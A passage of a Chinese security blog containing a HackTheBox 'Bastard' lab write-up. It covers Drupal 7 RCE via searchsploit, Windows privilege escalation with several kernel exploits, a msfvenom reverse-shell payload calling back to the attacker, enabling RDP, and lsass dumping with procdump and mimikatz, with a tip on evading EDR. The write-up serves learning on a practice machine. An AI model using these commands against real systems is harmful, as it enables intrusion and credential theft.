<li><a href="https://wuhuijung.github.io/blog/2018/10/31/%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">DNS 域传送漏洞 - WUJINLIN 的博客 | WUJINLIN</a></li>
<li><a href="https://blog.csdn.net/c465869935/article/details/53444117" target="_blank" rel="noopener">DNS 域传送漏洞的收集、检测与利用_运维_LandGrey-On the way to become a hacker-CSDN 博客</a></li>
<li><a href="https://www.cnblogs.com/hubavyn/p/4607094.html" target="_blank" rel="noopener">Linux /etc/cron.d 作用（转自 定时任务 crontab cron.d） - 林枫水湾湾 - 博客园</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/15/yuque/HackTheBox%EF%BC%9ABastard%20%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/15/yuque/HackTheBox%EF%BC%9ABastard%20%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Bastard 笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-15T21:49:28+08:00">
                2020-04-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近在<strong>玩 H</strong>ack<strong>T</strong>he<strong>B</strong>ox 上的靶机，觉得还是可以学到不少东西，下面就由<br>如果也有想玩靶机的师傅，可以去注册个帐号玩玩，它注册的时候也需要完成一个类似 CTF 的题，还蛮有意思的。<br>下面进入正题<br><strong>靶机地址</strong><code>10.10.10.9</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587124122471-8f43fcd0-7c5a-4be4-96a8-2f27ab2de635.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=893&size=157418&status=done&style=none&width=446.5" alt="image.png"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587118777861-a016a5fb-bf1c-4139-8946-a3e7fd7db479.png#align=left&display=inline&height=440&margin=%5Bobject%20Object%5D&name=image.png&originHeight=879&originWidth=1284&size=83182&status=done&style=none&width=642" alt="image.png"><br>80 跑的一个<code>drupal</code>，之前某靶场遇到过，用 msf 里 rce 的 exp 打一下，失败了</p>
<h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -sV -sC -Pn  -oA  scans/nmap-allports.tcp 10.10.10.9</span></span><br><span class="line">Nmap scan report for 10.10.10.9</span><br><span class="line">Host is up (0.49s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Microsoft IIS httpd 7.5</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/</span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt</span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt</span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-<span class="keyword">server</span>-header: Microsoft-IIS/<span class="number">7.5</span></span><br><span class="line">|_http-title: Welcome <span class="keyword">to</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.9</span> | <span class="number">10.10</span><span class="number">.10</span><span class="number">.9</span></span><br><span class="line"><span class="number">135</span>/tcp   <span class="keyword">open</span>  msrpc   Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp <span class="keyword">open</span>  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>-sC</strong>:使用 nmap 默认的脚本扫描</li>
<li><strong>-sV</strong>: 确定操作系统版本</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>-<strong>Pn</strong>: 不 ping 直接扫</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li><strong>-oA</strong>:输出扫描结果到指定文件夹</li>
</ul>
</blockquote>
<p>拿到 Drupal 的大版本 7 之后，要确定小版本，看到 NMAP 扫出来一些静态文件，找到了版本是<code>7.54</code><br>用<code>searchsploit drupal 7</code> 找，最终确定这几个</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Drupal 7.x Module Services - Remote Code Execution  | exploits/php/webapps/41564.php</span><br><span class="line">Drupal &lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)     | exploits/php/webapps/44557.rb</span><br><span class="line">Drupal &lt; 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)  | exploits/php/webapps/44542.txt</span><br><span class="line">Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - 'Drupalgeddon2' Remote Code Ex | exploits/php/webapps/44449.rb</span><br></pre></td></tr></table></figure>

<p>用以下代码<code>searchsploit -m exploits/php/webapps/41564.php</code>拷贝 exp 到当前目录，更改一下路径为<code>/rest</code><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587060858392-69fc71fa-0cdc-49ff-bcac-04371601d3e3.png#align=left&display=inline&height=425&margin=%5Bobject%20Object%5D&name=image.png&originHeight=850&originWidth=1055&size=105857&status=done&style=none&width=528" alt="image.png"><br>这里<code>/rest</code>的路径，其实是需要用<code>dirb</code>或者<code>dirbuster</code>来爆的，不过我因为延迟很大就没有扫，直接从别人的 wp 知道的，运行 exp，就可以得到 webshell 了。</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿到 webshell 之后，用信息收集脚本<code>WinPEAS</code>(<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a>)一通收集，加上自己一直在尝试，确定了几个可用的提权方式</p>
<h2 id="提权：MS15-051"><a href="#提权：MS15-051" class="headerlink" title="提权：MS15-051"></a>提权：MS15-051</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=<span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span> LPORT=<span class="number">4444</span> &gt; msf64.exe^C</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler  \</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp \</span><br><span class="line">set  lhost</span><br></pre></td></tr></table></figure>

<p>需要注意的是，x64 和 x86 的 listener 是不一样的</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587059785848-cd640ec9-f850-4b00-93b6-e6eed764887d.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&name=image.png&originHeight=352&originWidth=1919&size=65150&status=done&style=none&width=746" alt="image.png"><br>默认是 x86 的 shell，<strong>失败</strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587061602899-47a23321-ad14-4b91-b4de-ccb57369fbc0.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=181&originWidth=1454&size=41373&status=done&style=none&width=727" alt="image.png"></p>
<p>而在 x64 的 shell 内提权，<strong>成功</strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587061518084-62ef4fae-c7b9-4f5b-a55c-ecaed24e1b0f.png#align=left&display=inline&height=360&margin=%5Bobject%20Object%5D&name=image.png&originHeight=927&originWidth=1919&size=186816&status=done&style=none&width=746" alt="image.png"></p>
<h2 id="提权：MS10-059"><a href="#提权：MS10-059" class="headerlink" title="提权：MS10-059"></a>提权：MS10-059</h2><p>这个在 msf 里并没有对应的利用模块，不过在 github 上找到了<a href="https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe" target="_blank" rel="noopener">https://github.com/Re4son/Chimichurri/blob/master/Chimichurri.exe</a>，是可用的提权 exe</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chimichurri.exe <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span> <span class="number">4443</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587118423587-e1b3a276-30f4-45a4-8b6a-a7e51a11afd4.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=1109&size=62408&status=done&style=none&width=555" alt="image.png"><br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059</a></p>
<h2 id="提权：MS14-058"><a href="#提权：MS14-058" class="headerlink" title="提权：MS14-058"></a>提权：MS14-058</h2><blockquote>
<p>2014-10-30 消息</p>
</blockquote>
<blockquote>
<p>由 CrowStrike 发现，使用了半年多的 Windows 本地提权漏洞 MS14-058(CVE-2014-4113)工具已经公开。<br>其提权成功率达到 100%:</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587102168225-8112a6b1-a418-4df5-8ed6-678a5306ca7e.png#align=left&display=inline&height=201&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1783&size=114804&status=done&style=none&width=746" alt="image.png"></p>
<p>后来接上了 cs 常识提权。不过不知什么缘故，只有 80 端口可以建立 cs 的会话，443、4444 或 8888 端口均无法反弹<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587101700488-b0ad6e39-c734-4ae6-bac9-94aca645fb63.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&name=image.png&originHeight=726&originWidth=1078&size=43635&status=done&style=none&width=539" alt="image.png"><br>直接上<code>ms14-058</code>，可以看到成功提权为<code>system</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587104941645-1ee0b0d0-6e6f-4dd1-98be-e430100c3bae.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=image.png&originHeight=320&originWidth=1919&size=55109&status=done&style=none&width=746" alt="image.png"></p>
<h1 id="之后的玩法"><a href="#之后的玩法" class="headerlink" title="之后的玩法"></a>之后的玩法</h1><p>用<code>webshell</code>找到帐号密码，进数据库玩玩，admin 的密码是<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587102459105-4ec2f0ce-81dd-4de2-ba27-080feae280de.png#align=left&display=inline&height=287&margin=%5Bobject%20Object%5D&name=image.png&originHeight=573&originWidth=705&size=77260&status=done&style=none&width=353" alt="image.png"><br>cmd5 无法解密，但是可以参考<a href="https://www.isfirst.net/drupal/drupal-reset-password" target="_blank" rel="noopener">drupal-reset-password</a>，将其更改为已知密码 123456 的密文，登录后台看有无上传 shell 的点（后面发现，后台其实也有能拿 shell 的地方，但是对这个靶机没有意义了，毕竟不是 sql 注入进来的）</p>
<h2 id="开-3389-进远程桌面"><a href="#开-3389-进远程桌面" class="headerlink" title="开 3389 进远程桌面"></a>开 3389 进远程桌面</h2><p><code>meterpreter</code>里开<code>rdp</code>远程桌面</p>
<p><code>run getgui -h</code>可以看添加用户的格式，注意密码的强度要到位</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Win7、Win2003、XP 系统</span></span><br><span class="line"></span><br><span class="line"><span class="section">## 在 CMD 命令行开启 3389 端口：</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"><span class="section">## 在 CMD 命令行关闭 3389 端口（将 00000000 改成 11111111 即可）：</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587066521634-e4f0b478-3cb5-4cd9-94cc-090ae6a6b8c7.png#align=left&display=inline&height=333&margin=%5Bobject%20Object%5D&name=image.png&originHeight=855&originWidth=1918&size=154513&status=done&style=none&width=746" alt="image.png"><br>直接进 rdp 了</p>
<h2 id="抓-hash"><a href="#抓-hash" class="headerlink" title="抓 hash"></a>抓 hash</h2><p>一般而言，我在 windows 下抓<code>hash</code>会用 2 种方法：<br>第一种，在<code>meterpreter</code>的会话里直接<strong><code>hashdump</code></strong>，或者开 coablt strike 直接<code>run mimikatz</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:d3c87620c26302e9f04a756e3301e63a:::</span><br><span class="line">dimitris:<span class="number">1004</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">57544</span>bb8930967eee7f44d46f8bfe59d:::</span><br><span class="line">Guest:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p>我个人偏向于第二种<strong>:转储<code>lsass.exe</code>文件</strong>，拖回本地用<code>mimikatz</code>来读<code>hash</code>。这种方法的好处是不用对<code>mimikatz</code>进行免杀，因为实战环境的内网里一般都有<code>EDR</code>，遇到个人主机运行 mimikatz 这种行为，肯定是会报异常的，搞不好权限就要丢失，这时候就适宜用拖这种转储文件回本地的办法来抓 hash。<br><strong>prodump.exe 工具</strong><br>该工具是微软出品的工具，具有一定免杀效果。可以利用 procdump 把 lsass 进程的内存文件导出本地，再在本地利用 mimikatz 读取密码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 转储lsass</span></span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass_dump</span><br><span class="line"></span><br><span class="line"><span class="comment">#lsass_dump.dmp为保存dump数据的文件</span></span><br><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass_dump.dmp"</span> <span class="string">"sekurlsa::logonPasswords full"</span> exit</span><br></pre></td></tr></table></figure>

<p>另外，当系统为 win10 或 2012R2 以上时，<strong>默认在内存缓存中禁止保存明文密码</strong>，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br></pre></td></tr></table></figure>

<h1 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h1><ul>
<li><p>其实搞这个靶机，最困难的步骤还是 找到 <code>drupal 7</code>的那个 RCE，网上很多人使用这两款工具来对<code>drupal</code>进行有针对的扫描，<a href="https://github.com/topics/drupalgeddon2" target="_blank" rel="noopener">https://github.com/topics/drupalgeddon2</a>和<a href="https://github.com/droope/droopescan" target="_blank" rel="noopener">https://github.com/droope/droopescan</a>，也可以确定到这个漏洞，有兴趣的朋友不妨试试</p>
</li>
<li><p><code>Drupal 7</code>的配置文件（数据库密码）路径为<code>/sites/default/settings.php</code></p>
</li>
<li><p><code>Drupal</code>的具体版本可在<code>/CHANGELOG.txt</code>中确定，其它 CMS 类似思路，多找找 readme 之类的文件</p>
</li>
<li><p>如果想改 Drupal 的管理员密码，找到表 users，找到里面的用户名对应的密码框。可以直接复制其他用户的密码到忘记密码的账户上面。还可以直接复制（这段加密代码明文是：123456，稍后用这个密码登录即可）：</p>
</li>
</ul>
<p><code>$S$DRIG34Wb.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4</code></p>
<ul>
<li>Windows 补丁一览表</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">漏洞列表</span><br><span class="line"></span><br><span class="line"><span class="comment">#Security Bulletin   #KB     #Description    #Operating System</span></span><br><span class="line"></span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-0213</span> 　[Windows COM Elevation of Privilege Vulnerability]　　(windows <span class="number">10</span>/<span class="number">8.1</span>/<span class="number">7</span>/<span class="number">2016</span>/<span class="number">2010</span>/<span class="number">2008</span>)</span><br><span class="line">MS17<span class="number">-010</span> 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows <span class="number">7</span>/<span class="number">2008</span>/<span class="number">2003</span>/XP)</span><br><span class="line">MS16<span class="number">-135</span> 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(<span class="number">2016</span>)</span><br><span class="line">MS16<span class="number">-098</span> 　[KB3178466]　　[Kernel Driver]　　(Win <span class="number">8.1</span>)</span><br><span class="line">MS16<span class="number">-075</span> 　[KB3164038]　　[Hot Potato]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-032</span> 　[KB3143141]　　[Secondary Logon Handle]　　(<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">10</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-016</span> 　[KB3136041]　　[WebDAV]　　(<span class="number">2008</span>/Vista/<span class="number">7</span>)</span><br><span class="line">MS15<span class="number">-097</span> 　[KB3089656]　　[remote code execution]　　(win8<span class="number">.1</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-076</span> 　[KB3067505]　　[RPC]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-077</span> 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/<span class="number">2000</span>/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-061</span> 　[KB3057839]　　[Kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-051</span> 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-010</span> 　[KB3036220]　　[Kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS15<span class="number">-015</span> 　[KB3031432]　　[Kernel Driver]　　(Win7/<span class="number">8</span>/<span class="number">8.1</span>/<span class="number">2012</span>/RT/<span class="number">2012</span> R2/<span class="number">2008</span> R2)</span><br><span class="line">MS15<span class="number">-001</span> 　[KB3023266]　　[Kernel Driver]　　(<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-070</span> 　[KB2989935]　　[Kernel Driver]　　(<span class="number">2003</span>)</span><br><span class="line">MS14<span class="number">-068</span> 　[KB3011780]　　[Domain Privilege Escalation]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-058</span> 　[KB3000061]　　[Win32k.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-040</span> 　[KB2975684]　　[AFD Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-002</span> 　[KB2914368]　　[NDProxy]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS13<span class="number">-053</span> 　[KB2850851]　　[win32k.sys]　　(XP/Vista/<span class="number">2003</span>/<span class="number">2008</span>/win <span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-046</span> 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-005</span> 　[KB2778930]　　[Kernel Mode Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/win7/<span class="number">8</span>)</span><br><span class="line">MS12<span class="number">-042</span> 　[KB2972621]　　[Service Bus]　　(<span class="number">2008</span>/<span class="number">2012</span>/win7)</span><br><span class="line">MS12<span class="number">-020</span> 　[KB2671387]　　[RDP]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-080</span> 　[KB2592799]　　[AFD.sys]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-062</span> 　[KB2566454]　　[NDISTAPI]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-046</span> 　[KB2503665]　　[AFD.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-011</span> 　[KB2393802]　　[kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP/Vista)</span><br><span class="line">MS10<span class="number">-092</span> 　[KB2305420]　　[Task Scheduler]　　(<span class="number">2008</span>/<span class="number">7</span>)</span><br><span class="line">MS10<span class="number">-065</span> 　[KB2267960]　　[FastCGI]　　(IIS <span class="number">5.1</span>, <span class="number">6.0</span>, <span class="number">7.0</span>, <span class="keyword">and</span> <span class="number">7.5</span>)</span><br><span class="line">MS10<span class="number">-059</span> 　[KB982799]　　 [ACL-Churraskito]　　(<span class="number">2008</span>/<span class="number">7</span>/Vista)</span><br><span class="line">MS10<span class="number">-048</span> 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/<span class="number">2003</span> SP2/Vista SP1 &amp; SP2/<span class="number">2008</span> Gold &amp; SP2 &amp; R2/Win7)</span><br><span class="line">MS10<span class="number">-015</span> 　[KB977165]　　 [KiTrap0D]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS09<span class="number">-050</span> 　[KB975517]　　 [Remote Code Execution]　　(<span class="number">2008</span>/Vista)</span><br><span class="line">MS09<span class="number">-020</span> 　[KB970483]　　 [IIS <span class="number">6.0</span>]　　(IIS <span class="number">5.1</span> <span class="keyword">and</span> <span class="number">6.0</span>)</span><br><span class="line">MS09<span class="number">-012</span> 　[KB959454]　　 [Chimichurri]　　(Vista/win7/<span class="number">2008</span>/Vista)</span><br><span class="line">MS08<span class="number">-068</span> 　[KB957097]　　 [Remote Code Execution]　　(<span class="number">2000</span>/XP)</span><br><span class="line">MS08<span class="number">-067</span> 　[KB958644]　　 [Remote Code Execution]　　(Windows <span class="number">2000</span>/XP/Server <span class="number">2003</span>/Vista/Server <span class="number">2008</span>)</span><br><span class="line">MS08<span class="number">-025</span> 　[KB941693]　　 [Win32.sys]　　(XP/<span class="number">2003</span>/<span class="number">2008</span>/Vista)</span><br><span class="line">MS06<span class="number">-040</span> 　[KB921883]　　 [Remote Code Execution]　　(<span class="number">2003</span>/xp/<span class="number">2000</span>)</span><br><span class="line">MS05<span class="number">-039</span> 　[KB899588]　　 [PnP Service]　　(Win <span class="number">9</span>X/ME/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br><span class="line">MS03<span class="number">-026</span> 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/<span class="number">2000</span>/XP/<span class="number">2003</span>)</span><br></pre></td></tr></table></figure>

<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li><a href="https://www.cnblogs.com/dgjnszf/p/11246612.html" target="_blank" rel="noopener">分享一个转储 lsass.exe 进程的工具 - CE653A - 博客园</a></li>
<li><a href="https://0xdf.gitlab.io/2019/03/12/htb-bastard.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/03/12/htb-bastard.html</a></li>
<li><a href="https://prakash-khadka.com.np/hackthebox-bastard-windows/" target="_blank" rel="noopener">https://prakash-khadka.com.np/hackthebox-bastard-windows/</a></li>
<li><a href="https://github.com/Re4son/Chimichurri" target="_blank" rel="noopener">https://github.com/Re4son/Chimichurri</a></li>
<li><a href="https://www.isfirst.net/drupal/drupal-reset-password" target="_blank" rel="noopener">https://www.isfirst.net/drupal/drupal-reset-password</a></li>
<li><a href="https://www.freebuf.com/column/228496.html" target="_blank" rel="noopener">windows hash 抓取总结 - FreeBuf 专栏·TideSec</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/10/yuque/MKCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93%E3%80%90CVE%E3%80%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/10/yuque/MKCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93%E3%80%90CVE%E3%80%91/" itemprop="url">MKCMS代码审计小结【CVE】</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-10T21:55:55+08:00">
                2020-04-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
